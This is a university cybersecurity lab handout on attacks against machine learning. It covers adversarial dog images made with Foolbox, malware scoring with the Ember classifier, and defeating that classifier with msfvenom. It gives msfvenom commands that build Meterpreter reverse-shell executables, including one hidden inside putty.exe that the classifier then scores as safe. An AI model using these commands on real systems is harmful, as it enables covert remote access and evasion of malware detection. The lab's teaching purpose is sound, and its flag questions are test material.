# Lab 10: AI

Artificial Intelligence is a collection of technologies that allows computers to simulate human intelligence. Its applicability in cybersecurity involves all aspects of AI, including natural language processing, speech recognition, expert systems, robotics and vision. Fundamental to  these types of AI is machine learning, a technology that uses an approach to learning that tries and mimics the way nerve cells work in the brain. 

 One area of active research in machine learning is the use of adversarial images. This is where slight changes in the image causes machine learning systems to incorrectly classify objects within the image. So for example, a panda is wrongly recognised as a gibbon. The changes to the image can be imperceptible to a human and so this type of attack could be used to alter a radiological image and change a negative diagnosis of cancer to a positive one in a system that is automatically screening for cancer. 

Adversarial attacks could become increasingly common as we come to rely on machine learning systems to automate processes and decisions. This has made the field of research into defences against this type of attack important. 

In the area of malware recognition, malware can adopt tactics to prevent recognition by taking an adversarial approach. 

To see how this works, we can use a program that uses what is called a non-targetted black box approach to adversarial images. 

Start the docker container as follows:

{% tabs %}
{% tab title="Windows/Apple Intel" %}
```bash
docker run -v /projects/share:/opt/adversarial/share -it cybernemosyne/cits1003:ai
```
{% endtab %}

{% tab title="Apple Silicon" %}
```
docker run -v /projects/share:/opt/adversarial/share -it cybernemosyne/cits1003:ai-x
```
{% endtab %}
{% endtabs %}

The -v flag will allow you to share a local directory with the container which we are going to use to get image files. So use a local directory with nothing in it.

Once on the docker container, go to the directory /opt/adversarial/share. From there, run the exploit.py program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes for a toolkit called Foolbox \([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)\). 

To run the script we do so as follows:

```bash
/share# python exploit.py lab_og.jpg 
2021-07-11 12:35:07.359638: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2021-07-11 12:35:07.359708: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
2021-07-11 12:35:08.344216: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2021-07-11 12:35:08.344308: W tensorflow/stream_executor/cuda/cuda_driver.cc:326] failed call to cuInit: UNKNOWN ERROR (303)
2021-07-11 12:35:08.344341: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (3432bc8b6c77): /proc/driver/nvidia/version does not exist
2021-07-11 12:35:08.344489: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2021-07-11 12:35:09.101308: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:176] None of the MLIR Optimization Passes are enabled (registered 2)
2021-07-11 12:35:09.101793: I tensorflow/core/platform/profile_utils/cpu_utils.cc:114] CPU Frequency: 2400000000 Hz
Processing image: prediction: Labrador_retriever confidence: 41.81845486164093
2021-07-11 12:35:09.782377: W tensorflow/core/framework/cpu_allocator_impl.cc:80] Allocation of 27095040 exceeds 10% of free system memory.
Saving Input
Processing image: prediction: Labrador_retriever confidence: 41.81845486164093
Saving Epsilon = 0.010
Processing image: prediction: S***** confidence: 13.087703287601471
Saving Epsilon = 0.100
Processing image: prediction: W******* confidence: 14.949022233486176
Saving Epsilon = 0.150
Processing image: prediction: W******* confidence: 16.211819648742676
```

This takes the initial image of lab\_og.jpg and then creates different versions of the image with the perturbations added. The script tests these images against the neural network and very quickly stops recognising a Labrador and starts recognising other dog types such as the Saluki and Weimaraner, although note that the levels of confidence in that result are very low ~ 16%.

After running the program, you should have some files:

```bash
root@3432bc8b6c77:/opt/adversarial/share# ls -al
total 652
drwxr-xr-x 1 root root   4096 Jul 11 12:39  .
drwxr-xr-x 1 root root   4096 Jul 11 12:35  ..
-rw-r--r-- 1 root root 135191 Jul 11 12:39 'Epsilon = 0.010.jpg'
-rw-r--r-- 1 root root 175515 Jul 11 12:39 'Epsilon = 0.100.jpg'
-rw-r--r-- 1 root root 200878 Jul 11 12:39 'Epsilon = 0.150.jpg'
-rw-r--r-- 1 root root 134549 Jul 11 12:39  Input.jpg
```

Back on your own machine, these files should be in the directory you specified to share with the docker container. We are now going to test these out on an image recognition program run by Wolfram which is here [https://www.imageidentify.com](https://www.imageidentify.com)

Load the first image, Input.jpg, into the site and verify that it is correctly recognised. Then try with each of the other adversarial images starting with Epsilon = 0.010.jpg and going up. If the site errors out, wait a bit and then try again, it seems to not like images being loaded too quickly. Eventually, it should fail to recognise the last image which has had the most perturbations applied to it. 

### Question 1. Enter the wrong dog

**Flag: Enter the name of the dog type that Wolfram recognises when the "Epsilon = 0.150.jpg" file is uploaded.**

{% tabs %}
{% tab title="" %}

{% endtab %}

{% tab title="Hint" %}
If Wolfram isn't working for you, it was the same prediction as the exploit script gave!
{% endtab %}
{% endtabs %}

To a human eye, the dog is still a Labrador albeit a bit fuzzy. Remember that this is not a targetted attack in that we haven't trained the attack using the specific neural network used by the Wolfram site. If we did, we could develop something that would work at much lower levels of disturbance.

Try the same attack but this time using another picture - one of a bear:

![](.gitbook/assets/bear.jpg)

You can right click on this and save it to your share folder and then run the program again. 

Try with your own images - they need to be the appropriate size of 700px wide so scale them down by resizing in photo editing software if they are larger.

## Malware recognition with Ember

Detecting malware relies on a static analysis of features such as the hash of the file and its use of strings \(as we saw when we used Yara to identify malware\). This is fine if you encounter malware that is something you have in a database of malware samples. Machine learning however tries to identify new malware by analysing the features and using a model that has been trained on millions of previous samples to be able to answer the question of whether the program is malware or not, rather than identifying the specific type of malware.

The Elastic Malware Benchmark for Empowering Researchers \(Ember\) \([https://github.com/elastic/ember](https://github.com/elastic/ember)\) is a neural network that uses features extracted from binary files to train a model that can distinguish malware from regular Windows' programs. 

To do this, Ember uses a framework called LIEF that will analyse Windows \(and other platforms\) binaries \([https://github.com/lief-project/LIEF](https://github.com/lief-project/LIEF)\). The data that LIEF produces is then uses a "fingerprint" of the binary and can be used to train the model. 

To test the model cd on the same docker container to the directory /opt/ember. The model has been pre-trained and so you don't need to do that, although if you are interested, you can \(look at the GitHub page\).

To test the malware, we can use the following command:

```bash
/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt malware 
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Unable to find the section associated with BOUND_IMPORT
0.99999...
root@3432bc8b6c77:/opt/ember# 
```

The script classify\_binary.py takes the trained model as an argument and the binary file to analyse. As you can see, the malware is given a 99.99% probability of being malware.

{% hint style="danger" %}
This \*is\* real malware - do not download to your PC or try and execute
{% endhint %}

The malware is actually Emotet, which is a banking trojan. 

We can now try with a normal Windows program git.exe

```bash
root@3432bc8b6c77:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt git.exe 
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Unable to find the section associated with CERTIFICATE_TABLE
PGO: UNKNOWN is not implemented yet!
1.7266520173797455e-07
```

What is returned is a \*very\* small number

$$
1.7*10^{-7}
$$

 In other words, a practically 0 score for it being malware. 

### Question 2. It was malware, probably...

**Flag: Enter the full classification probability for the malware you found above**

## Evading the classification Msfvenom and Meterpreter

Msfvenom is a utility that comes with what is called an exploitation framework called Metasploit. Metasploit is a sophisticated toolset that is used by penetration testers \(and hackers\) to explore vulnerabilities and exploit them. Msfvenom can generate various payloads that when run on a target machine, will create remote access to that machine for attackers. One of these payloads is called a Meterpreter shell and normally this is recognised as malware by anti-malware software. 

Msfvenom comes with a variety of evasion techniques to avoid detection but most are easily detected by anti-malware software. However, there exists one approach that does fool anti-malware, especially  machine learning classifiers. 

To get started, we are going to run Metasploit, and to do this we will run a Docker container in a separate terminal/cmd window as follows:

{% tabs %}
{% tab title="Windows/Apple Intel" %}
```bash
docker run -v $(pwd)/share:/opt/share -it heywoodlh/metasploit
```
{% endtab %}

{% tab title="Apple Silicon" %}
```
docker run -v $(pwd)/share:/opt/share -it heywoodlh/metasploit

```
{% endtab %}
{% endtabs %}

Instead of $\(pwd\) put the same local folder you were running for the AI container above.

Once this is running, you can type

```bash
msfconsole
```

and answer yes to the following question and no to the second.

After doing that, you should see something like this:

```bash
[!] The following modules could not be loaded!..\
[!] 	/usr/src/metasploit-framework/modules/auxiliary/gather/office365userenum.py
[!] Please see /home/msf/.msf4/logs/framework.log for details.
                                                  

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.0.53-dev                          ]
+ -- --=[ 2149 exploits - 1142 auxiliary - 366 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session

[*] Processing docker/msfconsole.rc for ERB directives.
[*] resource (docker/msfconsole.rc)> Ruby Code (236 bytes)
LHOST => 172.17.0.3
msf6 > 
```

The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :\) \).

We are going to need a file called putty.exe that we are going to use as a template for one of the Meterpreter versions and so download it now to the directory you have shared with the container:

```bash
https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
```

We are going to run msfvenom from the Metasploit command line to generate two versions of meterpreter executables. The first will run an unmodified meterpreter executable:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe > /opt/share/meterpreter1.exe
```

You don't really have to worry about the parameters but if you are interested, the LHOST and LPORT arguments tell Meterpreter where to connect back to i.e. our machine. The -f exe tells Meterpreter that we are using an executable format for the payload.

Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable putty.exe. Putty is an application that allows SSH connections on a Windows box. Run the msfvenom command as follows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -x /opt/share/putty.exe > /opt/share/meterpreter2.exe
```

Now that we have the two samples, we can go back to our classifier and see what happens:

With the first version meterpreter1.exe we get:

```bash
root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter1.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Signature PDB_20 is not implemented yet!
0.9999986237635949
```

Definitely malware!

However, when we run the second version, we get:

```bash
root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter2.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
0.015146771950010027
```

So, according to the classifier, this is a normal, and safe, binary!

Msfvenom has other encoders that try and obfuscate the file to avoid detection. One of these is called shikata ga nai. You can create a meterpreter binary using the flag

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e shikata_ga_nai > /opt/share/meterpreter3.exe
```

However, when you classify this one, you will see that it is still recognised as malware.

It is important to note that machine learning evasion by masquerading as a normal binary is not an adversarial technique. You have simply overwhelmed the classifier with enough features of normal binaries that it tips it into classifying it as such. Adversarial techniques in malware are more difficult than whith images because you are more limited in what you can change. You still want a binary that works after your changes and so randomly changing bits of the file can easily stop it from doing that. 

### Question 3. Who is Metasploit?

**Flag: Type in whoami in the msf console and type in the username as the flag**

If you are interested, upload the meterpreter versions you created to VirusTotal and see what they are classified as there. 

